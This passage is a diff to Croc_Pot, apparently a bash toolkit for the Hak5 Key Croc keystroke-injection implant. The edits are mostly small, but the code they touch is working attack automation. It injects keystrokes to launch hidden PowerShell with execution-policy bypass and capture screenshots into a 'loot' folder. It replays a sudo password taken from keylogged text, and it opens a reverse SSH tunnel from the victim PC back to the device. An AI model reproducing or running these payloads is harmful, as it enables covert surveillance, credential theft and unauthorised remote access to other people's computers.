+	Q ENTER\n	sleep 1\n	Q STRING \".((gwmi win32_volume -f 'label=''KeyCroc''').Name+'tools\Croc_Pot\winds_shot.ps1')\"\n	Q ENTER\n	sleep 5\n	Q STRING \"exit\"\n	Q ENTER\n	ATTACKMODE HID\n	LED FINISH\nelse\n	LED ATTACK
 echo -ne \"\\\$outputFile = \\\"\\\$Croc\loot\Croc_pot\screenshot\\\\\\\\\\\$(get-date -format 'yyyy-mm-%d HH.mm.ss').png\\\"\\\n\nAdd-Type -AssemblyName System.Windows.Forms\\\nAdd-type -AssemblyName System.Drawing\\\n\n\\\$Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen\\\n\\\$Width = \\\$Screen.Width\\\n
 \\\$Height = \\\$Screen.Height\\\n\\\$Left = \\\$Screen.Left\\\n\\\$Top = \\\$Screen.Top\\\n\\\$screenshotImage = New-Object System.Drawing.Bitmap \\\$Width, \\\$Height\\\n\n\\\$graphicObject = [System.Drawing.Graphics]::FromImage(\\\$screenshotImage)\\\n\\\$graphicObject.CopyFromScreen(\\\$Left, \\\$Top, 0, 0, \\\$screenshotImage.Size)\\\n
-\\\$screenshotImage.Save(\\\$outputFile)\\\nWrite-Output \\\"Saved to:\\\"\\\nWrite-Output \\\$outputFile\\\nStart-Sleep -s 5\" >> \${WINDS_SHOT}\n      Q GUI r\n      sleep 1\n      Q STRING \"powershell -nop -ex Bypass -w Hidden\"\n      Q ENTER\n      sleep 1\n      Q STRING \"\\\$Croc = (gwmi win32_volume -f 'label=\\\"KeyCroc\\\"' | Select-Object -ExpandProperty DriveLetter)\"
-      Q ENTER\n      sleep 1\n      Q STRING \".((gwmi win32_volume -f 'label=''KeyCroc''').Name+'tools\Croc_Pot\winds_shot.ps1')\"\n      Q ENTER\n      sleep 5\n      Q STRING \"exit\"\n      Q ENTER\n      ATTACKMODE HID\n      LED FINISH\n    fi\nelse\n  HOST_CHECK=\$(sed -n 3p \${CROC_OS})\n   case \$HOST_CHECK in
-      raspberrypi)\n      LED ATTACK\n      Q ALT-F4\n      sleep 1\n      Q GUI d\n      Q STRING \"terminal\"\n      Q ENTER\n      Q ENTER\n      sleep 1\n      Q STRING \"PC_PIC=/media/\\\$(whoami)/KeyCroc/loot/Croc_Pot/screenshot/%b-%d-%y-%H.%M.%S.png; nohup scrot -b -d 5 \\\${PC_PIC} &>/dev/null & exit\"
-      Q ENTER\n      Q ALT-TAB\n      Q ALT-TAB\n      sleep 10\n      ATTACKMODE HID\n      LED FINISH;;\n    parrot)\n      LED ATTACK\n      Q ALT F2\n      sleep 1\n      Q STRING \"mate-terminal\"\n      Q ENTER\n      sleep 1\n      Q STRING \"sudo mkdir /media/\\\$(whoami)/KeyCroc/; sudo mount /dev/sdd /media/\\\$(whoami)/KeyCroc/ -o rw,users,umask=0; sudo chmod 777 /media/\\\$(whoami)/KeyCroc/\"
-      Q ENTER\n      sleep 1\n      Q STRING \"\${PC_PW}\"\n      Q ENTER\n      sleep 1\n      Q STRING \"sleep 2; import -window root /media/\\\$(whoami)/KeyCroc/loot/Croc_Pot/screenshot/\$(date '+%Y-%m-%d.%H.%M.%S').png; sudo umount /media/\\\$(whoami)/KeyCroc/; sudo rmdir /media/\\\$(whoami)/KeyCroc/; exit\"\n      Q ENTER\n      Q ALT-TAB\n      sleep 10
-      ATTACKMODE HID\n      LED FINISH;;\n    *)\n      LED ATTACK\n      Q ALT F2\n      sleep 1\n      Q STRING \"mate-terminal\"\n      Q ENTER\n      sleep 1\n      Q STRING \"sudo mkdir /media/\\\$(whoami)/KeyCroc/; sudo mount /dev/sdd /media/\\\$(whoami)/KeyCroc/ -o rw,users,umask=0; sudo chmod 777 /media/\\\$(whoami)/KeyCroc/\"
-      Q ENTER\n      sleep 1\n      Q STRING \"\${PC_PW}\"\n      Q ENTER\n      sleep 1\n      Q STRING \"sleep 2; import -window root /media/\\\$(whoami)/KeyCroc/loot/Croc_Pot/screenshot/\$(date '+%Y-%m-%d.%H.%M.%S').png; sudo umount /media/\\\$(whoami)/KeyCroc/; sudo rmdir /media/\\\$(whoami)/KeyCroc/; exit\"\n      Q ENTER\n      Q ALT-TAB\n      sleep 10\n      ATTACKMODE HID\n      LED FINISH;;\n esac\nfi" >> ${Croc_Shot} ;;
+\\\$screenshotImage.Save(\\\$outputFile)\\\nWrite-Output \\\"Saved to:\\\"\\\nWrite-Output \\\$outputFile\\\nStart-Sleep -s 5\" >> \${WINDS_SHOT}\n	Q GUI r\n	sleep 1\n	Q STRING \"powershell -nop -ex Bypass -w Hidden\"\n	Q ENTER\n	sleep 1\n	Q STRING \"\\\$Croc = (gwmi win32_volume -f 'label=\\\"KeyCroc\\\"' | Select-Object -ExpandProperty DriveLetter)\"
+	Q ENTER\n	sleep 1\n	Q STRING \".((gwmi win32_volume -f 'label=''KeyCroc''').Name+'tools\Croc_Pot\winds_shot.ps1')\"\n	Q ENTER\n	sleep 5\n	Q STRING \"exit\"\n	Q ENTER\n	ATTACKMODE HID\n	LED FINISH\n	fi\nelse\ncase \$HOST_CHECK in\nraspberrypi)\n	ATTACKMODE HID STORAGE\n	LED ATTACK\n	sleep 1\n	Q ALT-F4\n	Q GUI d\n	sleep 1\n	Q STRING \"LXTerminal\"\n	Q ENTER\n	Q ENTER
+	sleep 1\n	Q STRING \"PC_PIC=/media/\\\$(whoami)/KeyCroc/loot/Croc_Pot/screenshot/%b-%d-%y-%H.%M.%S.png; nohup scrot -b -d 5 \\\${PC_PIC} &>/dev/null & exit\"\n	Q ENTER\n	Q ALT-TAB\n	Q ALT-TAB\n	sleep 10\n	ATTACKMODE HID\n	LED FINISH ;;\nparrot)\n	ATTACKMODE HID STORAGE\n	LED ATTACK\n	Q ALT F2\n	sleep 1\n	Q STRING \"mate-terminal\"
+	Q ENTER\n	sleep 1\n	Q STRING \"sudo mkdir /media/\\\$(whoami)/KeyCroc/; sudo mount /dev/sdd /media/\\\$(whoami)/KeyCroc/ -o rw,users,umask=0; sudo chmod 777 /media/\\\$(whoami)/KeyCroc/\"
+	Q ENTER\n	sleep 1\n	Q STRING \"\${PC_PW}\"\n	Q ENTER\n	sleep 1\n	Q STRING \"sleep 2; import -window root /media/\\\$(whoami)/KeyCroc/loot/Croc_Pot/screenshot/\$(date '+%Y-%m-%d.%H.%M.%S').png; sudo umount /media/\\\$(whoami)/KeyCroc/; sudo rmdir /media/\\\$(whoami)/KeyCroc/; exit\"\n	Q ENTER\n	Q ALT-TAB\n	sleep 10
+	ATTACKMODE HID\n	LED FINISH;;\n*)\n	LED ATTACK\n	Q ALT F2\n	sleep 1\n	Q STRING \"mate-terminal\"\n	Q ENTER\n	sleep 1\n	Q STRING \"sudo mkdir /media/\\\$(whoami)/KeyCroc/; sudo mount /dev/sdd /media/\\\$(whoami)/KeyCroc/ -o rw,users,umask=0; sudo chmod 777 /media/\\\$(whoami)/KeyCroc/\"
+	Q ENTER\n	sleep 1\n	Q STRING \"\${PC_PW}\"\n	Q ENTER\n	sleep 1\n	Q STRING \"sleep 2; import -window root /media/\\\$(whoami)/KeyCroc/loot/Croc_Pot/screenshot/\$(date '+%Y-%m-%d.%H.%M.%S').png; sudo umount /media/\\\$(whoami)/KeyCroc/; sudo rmdir /media/\\\$(whoami)/KeyCroc/; exit\"\n	Q ENTER\n	Q ALT-TAB\n	sleep 10\n	ATTACKMODE HID\n	LED FINISH;;\n esac\nfi" >> ${Croc_Shot} ;;
 	[nN] | [nN][oO])
 		echo -ne "$(ColorYellow 'Maybe next time')\n";;
 	*)
@@ -3722,10 +3740,11 @@ Add-Type -AssemblyName System.Windows.Forms\nAdd-type -AssemblyName System.Drawi
 else
 	case $HOST_CHECK in
 	raspberrypi)
-		Q ALT-F4
 		sleep 1
+		Q ALT-F4
 		Q GUI d
-		Q STRING "terminal"
+		sleep 1
+		Q STRING "LXTerminal"
 		Q ENTER
 		Q ENTER
 		sleep 1
@@ -3743,8 +3762,8 @@ else
 		sleep 1
 		Q STRING "sudo mkdir /media/\$(whoami)/KeyCroc/; sudo mount /dev/sdd /media/\$(whoami)/KeyCroc/ -o rw,users,umask=0; sudo chmod 777 /media/\$(whoami)/KeyCroc/"
 		Q ENTER
-		sleep 1
-		Q STRING "${PC_PW}"
+		sleep 3
+		Q STRING "$(sed '$!d' /root/udisk/tools/Croc_Pot/Croc_unlock.txt.filtered)"
 		Q ENTER
 		sleep 1
 		Q STRING "sleep 2; import -window root /media/\$(whoami)/KeyCroc/loot/Croc_Pot/screenshot/$(date '+%Y-%m-%d.%H.%M.%S').png; sudo umount /media/\$(whoami)/KeyCroc/; sudo rmdir /media/\$(whoami)/KeyCroc/; exit"
@@ -3760,8 +3779,8 @@ else
 		sleep 1
 		Q STRING "sudo mkdir /media/\$(whoami)/KeyCroc/; sudo mount /dev/sdd /media/\$(whoami)/KeyCroc/ -o rw,users,umask=0; sudo chmod 777 /media/\$(whoami)/KeyCroc/"
 		Q ENTER
-		sleep 1
-		Q STRING "${PC_PW}"
+		sleep 3
+		Q STRING "$(sed '$!d' /root/udisk/tools/Croc_Pot/Croc_unlock.txt.filtered)"
 		Q ENTER
 		sleep 1
 		Q STRING "sleep 2; import -window root /media/\$(whoami)/KeyCroc/loot/Croc_Pot/screenshot/$(date '+%Y-%m-%d.%H.%M.%S').png; sudo umount /media/\$(whoami)/KeyCroc/; sudo rmdir /media/\$(whoami)/KeyCroc/; exit"
@@ -3927,12 +3946,14 @@ keystorkes_V() {
 #----Status nmon monitoring system
 ##
 nmon_system() {
+	echo -ne "$(Info_Screen '-nmon is short for Nigels performance Monitor for Linux
+-More details at http://nmon.sourceforge.net/pmwiki.php')\n\n"
 	local status="$(dpkg-query -W --showformat='${db:Status-Status}' "nmon" 2>&1)"
 if [ ! $? = 0 ] || [ ! "$status" = installed ]; then
 	read_all INSTALL NMON MONITORING Y/N AND PRESS [ENTER]
 	case $r_a in
 	[yY] | [yY][eE][sS])
-		apt install nmon
+		apt -y install nmon
 		echo -ne "\n$(ColorGreen 'NMON MONITORING IS NOW INSTALLED')\n" ;;
 	[nN] | [nN][oO])
 		echo -ne "\n$(ColorYellow 'Maybe next time')\n" ;;
@@ -3948,7 +3969,7 @@ nmon
 #----Status list all match words in payloads
 ##
 list_match() {
-	echo -ne "$(Info_Screen '-List all MATCH words for your payloads
+	echo -ne "$(Info_Screen '-List all MATCH words in payloads folder
 -Option to change MATCH words')\n\n"
 if [ "$(OS_CHECK)" = WINDOWS ]; then
 	grep MATCH* /root/udisk/payloads/*.txt
@@ -4064,9 +4085,8 @@ fi
 ##
 midnight_manager() {
 	clear
-	echo -ne "$(Info_Screen '- Midnight Commander, visual file manager
-- Check link below on How to use
-- https://www.linode.com/docs/guides/how-to-install-midnight-commander')\n"
+	echo -ne "$(Info_Screen '-GNU Midnight Commander is a visual file manager
+-More details at https://midnight-commander.org')\n"
 ##
 #----midnight install function
 ##
@@ -4076,7 +4096,7 @@ if [ ! $? = 0 ] || [ ! "$status" = installed ]; then
 	read_all INSTALL MIDNIGHT COMMANDER Y/N AND PRESS [ENTER]
 	case $r_a in
 	[yY] | [yY][eE][sS])
-		apt install mc
+		apt -y install mc
 		echo -ne "\n$(ColorGreen 'MIDNIGHT COMMANDER IS NOW INSTALLED')\n" ;;
 	[nN] | [nN][oO])
 		echo -ne "\n$(ColorYellow 'Maybe next time')\n" ;;
@@ -4154,7 +4174,7 @@ else
 		read_all ENTER COMMAND AND/OR WORD TO QUACK AND PRESS [ENTER]
 		Q GUI d
 		sleep 1
-		Q STRING "terminal"
+		Q STRING "LXTerminal"
 		Q ENTER
 		Q ENTER
 		sleep 1
@@ -4247,7 +4267,7 @@ function ssh_menu() {
 	read_all INSTALL SSHPASS Y/N AND PRESS [ENTER]
 	case $r_a in
 	[yY] | [yY][eE][sS])
-		apt install sshpass ;;
+		apt -y install sshpass ;;
 	[nN] | [nN][oO])
 		echo -ne "\n$(ColorYellow 'Maybe next time')\n" ;;
 	*)
@@ -4301,7 +4321,7 @@ fi
 #----SSH get public ip
 ##
 public_ip() {
-	echo -ne "${yellow}Public ip:${clear}${green}$(curl -s https://api.ipify.org) ${clear}"
+	echo -ne "${yellow}Public ip:${clear}${green}$(curl -s --connect-timeout 2 --max-time 2 https://api.ipify.org) ${clear}"
 }
 ##
 #----SSH check port 22 open or closed
@@ -4344,7 +4364,7 @@ fi
 ##
 	echo -ne "$(Info_Screen '-SSH into HAK5 gear & TARGET PC
 -Reverse ssh tunnel, Create SSH Public/Private Key
--Ensure your devices are connected to the same local network As keycroc')\n"
+-Ensure devices are connected to the same local network As keycroc')\n"
 check_device $(os_ip) TARGET PC: $(public_ip) ; port_check $(os_ip)
 check_device 172.16.42.1 WIFI PINEAPPLE: $(get_mac "172.16.42.1") ; port_check 172.16.42.1
 check_device 172.16.32.1 PACKET SQUIRREL: $(squirrel_mac) ; port_check 172.16.32.1
@@ -4413,52 +4433,35 @@ if [ "$(OS_CHECK)" = WINDOWS ]; then
 	Q STRING "powershell"
 	Q ENTER
 	sleep 2
-	Q STRING "Start-Process http://172.16.42.1:1471"
-	Q ENTER
-	sleep 3
-	Q ALT-TAB
-	sleep 2
-	Q STRING "exit"
+	Q STRING "Start-Process http://172.16.42.1:1471; exit"
 	Q ENTER
 else
 	case $HOST_CHECK in
 	raspberrypi)
 		Q GUI d
 		sleep 1
-		Q STRING "terminal"
+		Q STRING "LXTerminal"
 		Q ENTER
 		Q ENTER
 		sleep 1
-		Q STRING "gio open http://172.16.42.1:1471"
-		Q ENTER
-		sleep 3
-		Q ALT-TAB
-		sleep 1
-		Q ALT-F4;;
+		Q STRING "gio open http://172.16.42.1:1471; exit"
+		Q ENTER ;;
 	parrot)
 		Q ALT F2
 		sleep 1
 		Q STRING "mate-terminal"
 		Q ENTER
 		sleep 1
-		Q STRING "gio open http://172.16.42.1:1471"
-		Q ENTER
-		sleep 3
-		Q ALT-TAB
-		sleep 1
-		Q ALT-F4;;
+		Q STRING "gio open http://172.16.42.1:1471; exit"
+		Q ENTER ;;
 	*)
 		Q ALT F2
 		sleep 1
 		Q STRING "xterm"
 		Q ENTER
 		sleep 1
-		Q STRING "gio open http://172.16.42.1:1471"
-		Q ENTER
-		sleep 3
-		Q ALT-TAB
-		sleep 1
-		Q ALT-F4;;
+		Q STRING "gio open http://172.16.42.1:1471; exit"
+		Q ENTER ;;
 	esac
 fi
 }
@@ -4570,13 +4573,12 @@ else
 	raspberrypi)
 		Q GUI d
 		sleep 1
-		Q STRING "terminal"
+		Q STRING "LXTerminal"
 		Q ENTER
 		Q ENTER
 		sleep 1
 		Q STRING "ssh root@172.16.64.1"
-		Q ENTER
-		sleep 1 ;;
+		Q ENTER ;;
 	parrot)
 		Q ALT F2
 		sleep 1
@@ -4584,8 +4586,7 @@ else
 		Q ENTER
 		sleep 1
 		Q STRING "ssh root@172.16.64.1"
-		Q ENTER
-		sleep 1 ;;
+		Q ENTER ;;
 	*)
 		Q ALT F2
 		sleep 1
@@ -4593,8 +4594,7 @@ else
 		Q ENTER
 		sleep 1
 		Q STRING "ssh root@172.16.64.1"
-		Q ENTER
-		sleep 1 ;;
+		Q ENTER ;;
 	esac
 fi ;;
 	[nN] | [nN][oO])
@@ -4609,10 +4609,10 @@ fi ;;
 	[yY] | [yY][eE][sS])
 if [ "$(OS_CHECK)" = WINDOWS ]; then
 	LED ATTACK
-	ssh root@localhost -p 7000
+	ssh -o "StrictHostKeyChecking no" root@localhost -p 7000
 elif [ "$(OS_CHECK)" = LINUX ]; then
 	LED ATTACK
-	ssh root@localhost -p 7000
+	ssh -o "StrictHostKeyChecking no" root@localhost -p 7000
 fi ;;
 	[nN] | [nN][oO])
 		echo -ne "\n$(ColorYellow 'Maybe next time')\n" ;;
@@ -4799,13 +4799,15 @@ if [ -e "/root/udisk/tools/Croc_Pot/Croc_OS_Target.txt" ]; then
 		sleep 1
 		Q STRING "powershell -NoP -NonI -W Hidden -Exec Bypass"
 		Q ENTER
-		sleep 2
+		sleep 3
 		Q STRING "ssh -fN -R ${r_a}:localhost:22 root@$(ifconfig wlan0 | grep "inet addr" | awk {'print $2'} | cut -c 6-)"
 		Q ENTER
-		sleep 2
+		sleep 3
 		Q STRING "$(sed -n 1p /tmp/CPW.txt)"
 		Q ENTER
-		sleep 1
+		sleep 2
+		Q STRING "exit"
+		Q ENTER
 		Q ALT-TAB
 		start_shell
 else
@@ -4813,15 +4815,19 @@ else
 	raspberrypi)
 		Q GUI d
 		sleep 1
-		Q STRING "terminal"
+		Q STRING "LXTerminal"
 		Q ENTER
 		Q ENTER
 		sleep 1
 		Q STRING "ssh -fN -R ${r_a}:localhost:22 root@$(ifconfig wlan0 | grep "inet addr" | awk {'print $2'} | cut -c 6-)"
 		Q ENTER
+		sleep 2
+		Q STRING "$(sed -n 1p /tmp/CPW.txt)"
+		Q ENTER
 		sleep 1
 		Q STRING "exit"
 		Q ENTER
+		sleep 1
 		Q ALT-TAB
 		start_shell ;;
 	parrot)
@@ -4832,9 +4838,13 @@ else
 		sleep 1
 		Q STRING "ssh -fN -R ${r_a}:localhost:22 root@$(ifconfig wlan0 | grep "inet addr" | awk {'print $2'} | cut -c 6-)"
 		Q ENTER
+		sleep 2
+		Q STRING "$(sed -n 1p /tmp/CPW.txt)"
+		Q ENTER
 		sleep 1
 		Q STRING "exit"
 		Q ENTER
+		sleep 1
 		Q ALT-TAB
 		start_shell ;;
 	*)
@@ -4845,9 +4855,13 @@ else
 		sleep 1
 		Q STRING "ssh -fN -R ${r_a}:localhost:22 root@$(ifconfig wlan0 | grep "inet addr" | awk {'print $2'} | cut -c 6-)"
 		Q ENTER
+		sleep 2
+		Q STRING "$(sed -n 1p /tmp/CPW.txt)"
+		Q ENTER
 		sleep 1
 		Q STRING "exit"
 		Q ENTER
+		sleep 1
 		Q ALT-TAB
 		start_shell ;;
 	esac
@@ -4914,7 +4928,7 @@ remote_command() {
 -Example ssh root@192.168.1.1 uptime
 -ssh USER@HOST COMMAND1; COMMAND2; COMMAND3 or
 -ssh USER@HOST COMMAND1 | COMMAND2 | COMMAND3
--SSH between remote Linux hosts and get back the output')\n\n"
+-SSH between remote hosts and get back the output')\n\n"
 target_command() {
 	echo -ne "$(ColorBlue 'ENTER COMMAND AND PRESS [ENTER]'): "; read USER_COMMAND
 	ssh ${1}@${@:2} ${USER_COMMAND}
@@ -5092,52 +5106,35 @@ if [ "$(OS_CHECK)" = WINDOWS ]; then
 	Q STRING "powershell"
 	Q ENTER
 	sleep 2
-	Q STRING "Start-Process https://docs.hak5.org/hc/en-us/articles/360048657394-Factory-Reset"
-	Q ENTER
-	sleep 5
-	Q ALT-TAB
-	sleep 1
-	Q STRING "exit"
+	Q STRING "Start-Process https://docs.hak5.org/hc/en-us/articles/360048657394-Factory-Reset; exit"
 	Q ENTER
 else
 	case $HOST_CHECK in
 	raspberrypi)
 		Q GUI d
 		sleep 1
-		Q STRING "terminal"
+		Q STRING "LXTerminal"
 		Q ENTER
 		Q ENTER
 		sleep 1
-		Q STRING "gio open https://docs.hak5.org/hc/en-us/articles/360048657394-Factory-Reset"
-		Q ENTER
-		sleep 5
-		Q ALT-TAB
-		sleep 1
-		Q ALT-F4;;
+		Q STRING "gio open https://docs.hak5.org/hc/en-us/articles/360048657394-Factory-Reset; exit"
+		Q ENTER ;;
 	parrot)
 		Q ALT F2
 		sleep 1
 		Q STRING "mate-terminal"
 		Q ENTER
 		sleep 1
-		Q STRING "gio open https://docs.hak5.org/hc/en-us/articles/360048657394-Factory-Reset"
-		Q ENTER
-		sleep 5
-		Q ALT-TAB
-		sleep 1
-		Q ALT-F4;;
+		Q STRING "gio open https://docs.hak5.org/hc/en-us/articles/360048657394-Factory-Reset; exit"
+		Q ENTER ;;
 	*)
 		Q ALT F2
 		sleep 1
 		Q STRING "xterm"
 		Q ENTER
 		sleep 1
-		Q STRING "gio open https://docs.hak5.org/hc/en-us/articles/360048657394-Factory-Reset"
-		Q ENTER
-		sleep 5
-		Q ALT-TAB
-		sleep 1
-		Q ALT-F4;;
+		Q STRING "gio open https://docs.hak5.org/hc/en-us/articles/360048657394-Factory-Reset; exit"
+		Q ENTER ;;
 	esac
 fi
 }
@@ -5201,7 +5198,7 @@ remove_croc_pot() {
 	echo -ne "$(ColorRed 'ARE YOU SURE YOU WANT TO REMOVE CROCPOT TYPE YES OR NO AND PRESS [ENTER]:')"; read CROC_POT_REMOVE
 	case $CROC_POT_REMOVE in
 	[yY] | [yY][eE][sS])
-		apt -y remove unzip openvpn mc nmon
+		apt -y remove unzip openvpn mc nmon sshpass
 		rm -r /var/hak5c2 /root/udisk/loot/Croc_Pot /root/udisk/tools/Croc_Pot/Bunny_Payload_Shell /root/udisk/tools/Croc_Pot
 		rm /usr/local/bin/c2-3.1.2_armv7_linux /etc/systemd/system/hak5.service
 		rm /root/udisk/tools/kc_fw_1.3_510.tar.gz /root/udisk/payloads/Croc_Pot_Payload.txt
@@ -5259,7 +5256,7 @@ else
 	raspberrypi)
 		Q GUI d
 		sleep 1
-		Q STRING "terminal"
+		Q STRING "LXTerminal"
 		Q ENTER
 		Q ENTER
 		sleep 1
@@ -5299,7 +5296,7 @@ else
 	raspberrypi)
 		Q GUI d
 		sleep 1
-		Q STRING "terminal"
+		Q STRING "LXTerminal"
 		Q ENTER
 		Q ENTER
 		sleep 1
@@ -5390,7 +5387,7 @@ cloud_setup() {
 	[yY] | [yY][eE][sS])
 	local status_zip="$(dpkg-query -W --showformat='${db:Status-Status}' "unzip" 2>&1)"
 if [ ! $? = 0 ] || [ ! "$status_zip" = installed ]; then
-	apt install unzip
+	apt -y install unzip
 fi
 ##
 #----Hak5 Cloud_C2 download and install
@@ -5433,52 +5430,35 @@ if [ "$(OS_CHECK)" = WINDOWS ]; then
 	Q STRING "powershell"
 	Q ENTER
 	sleep 2
-	Q STRING "Start-Process http://$(ifconfig wlan0 | grep "inet addr" | awk {'print $2'} | cut -c 6-)"
-	Q ENTER
-	sleep 5
-	Q ALT-TAB
-	sleep 2
-	Q STRING "exit"
+	Q STRING "Start-Process http://$(ifconfig wlan0 | grep "inet addr" | awk {'print $2'} | cut -c 6-); exit"
 	Q ENTER
 else
 	case $HOST_CHECK in
 raspberrypi)
 	Q GUI d
 	sleep 1
-	Q STRING "terminal"
+	Q STRING "LXTerminal"
 	Q ENTER
 	Q ENTER
 	sleep 1
-	Q STRING "gio open http://$(ifconfig wlan0 | grep "inet addr" | awk {'print $2'} | cut -c 6-)"
-	Q ENTER
-	sleep 5
-	Q ALT-TAB
-	sleep 1
-	Q ALT-F4 ;;
+	Q STRING "gio open http://$(ifconfig wlan0 | grep "inet addr" | awk {'print $2'} | cut -c 6-); exit"
+	Q ENTER ;;
 parrot)
 	Q ALT F2
 	sleep 1
 	Q STRING "mate-terminal"
 	Q ENTER
 	sleep 1
-	Q STRING "gio open http://$(ifconfig wlan0 | grep "inet addr" | awk {'print $2'} | cut -c 6-)"
-	Q ENTER
-	sleep 5
-	Q ALT-TAB
-	sleep 1
-	Q ALT-F4 ;;
+	Q STRING "gio open http://$(ifconfig wlan0 | grep "inet addr" | awk {'print $2'} | cut -c 6-); exit"
+	Q ENTER ;;
 *)
 	Q ALT F2
 	sleep 1
 	Q STRING "xterm"
 	Q ENTER
 	sleep 1
-	Q STRING "gio open http://$(ifconfig wlan0 | grep "inet addr" | awk {'print $2'} | cut -c 6-)"
-	Q ENTER
-	sleep 5
-	Q ALT-TAB
-	sleep 1
-	Q ALT-F4 ;;
+	Q STRING "gio open http://$(ifconfig wlan0 | grep "inet addr" | awk {'print $2'} | cut -c 6-); exit"
+	Q ENTER ;;
 	esac
 fi
 }
